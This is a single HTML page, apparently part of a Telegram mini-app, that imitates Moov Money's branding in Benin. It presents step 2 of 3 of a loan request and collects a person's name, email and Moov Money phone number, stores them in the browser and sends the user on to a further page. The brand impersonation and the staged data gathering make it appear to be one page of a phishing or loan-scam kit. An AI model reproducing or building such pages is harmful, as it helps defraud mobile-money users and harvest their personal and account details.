<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money - Informations Personnelles</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #f26522;
            --moov-blue: #004b87;
            --bg-color: #e5e5e5;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        .app-header {
            width: 100%; background-color: var(--moov-blue); height: 60px; padding: 0 20px;
            display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;
            border-bottom: 3px solid var(--moov-orange);
        }
        .back-btn { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; }
        .header-title .moov { color: var(--moov-orange); margin-right: 4px; }
        .header-title .money { color: #ffffff; }

        .card {
            background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px;
            border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column;
        }
        .main-title { font-size: 26px; color: var(--moov-blue); margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }

        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--moov-orange); }

        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        .form-group label { font-size: 15px; font-weight: 700; color: #222; margin-bottom: 10px; }
        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid #cbd5e1; border-radius: 10px; outline: none; width: 100%; }
        .form-control:focus { border-color: var(--moov-blue); }

        .phone-group { display: flex; gap: 10px; }
        .country-prefix {
            display: flex; align-items: center; justify-content: center; gap: 6px;
            background-color: #f5f5f5; border: 1px solid #cbd5e1; border-radius: 10px; padding: 0 14px; font-weight: 700;
        }
        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
        .btn-prev { background-color: #e8e8e8; color: #555; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; }
        .btn-next { background-color: var(--moov-orange); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; }
    </style>
</head>
<body>

<div class="app-header">
    <a href="/page2" class="back-btn">← Retour</a>
    <div class="header-title">
        <span class="moov">Moov</span><span class="money">Money</span>
    </div>
    <div style="width:24px;"></div>
</div>

<div class="card">
    <h1 class="main-title">Demande de Prêt</h1>
    <div class="subtext">Étape 2 sur 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <form onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">Prénom</label>
            <input type="text" id="firstName" class="form-control" placeholder="Koffi" required>
        </div>

        <div class="form-group">
            <label for="lastName">Nom</label>
            <input type="text" id="lastName" class="form-control" placeholder="Mensah" required>
        </div>

        <div class="form-group">
            <label for="email">Adresse Email</label>
            <input type="email" id="email" class="form-control" placeholder="koffi.mensah@exemple.bj" required>
        </div>

        <div class="form-group">
            <label for="phone">Numéro de Téléphone Moov Money</label>
            <div class="phone-group">
                <div class="country-prefix">
                    <span>🇧🇯</span>
                    <span>+229</span>
                </div>
                <!-- Unrestricted phone input: accepts any number digits -->
                <input type="tel" id="phone" class="form-control" placeholder="Entrez votre numéro" required>
            </div>
            <div style="font-size:12px; color:#666; margin-top:6px;">Entrez votre numéro de téléphone</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="window.location.href='/page2'">PRÉCÉDENT</button>
            <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
        </div>
    </form>
</div>

<div class="footer-banner">© 2026 Moov Africa Bénin</div>

<script>
    function goNext(e) {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();

        if (!phone) {
            alert("Veuillez entrer un numéro de téléphone valide.");
            return;
        }

        localStorage.setItem('firstName', document.getElementById('firstName').value);
        localStorage.setItem('lastName', document.getElementById('lastName').value);
        localStorage.setItem('email', document.getElementById('email').value);
        localStorage.setItem('phone', phone);
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }
</script>
</body>
</html>
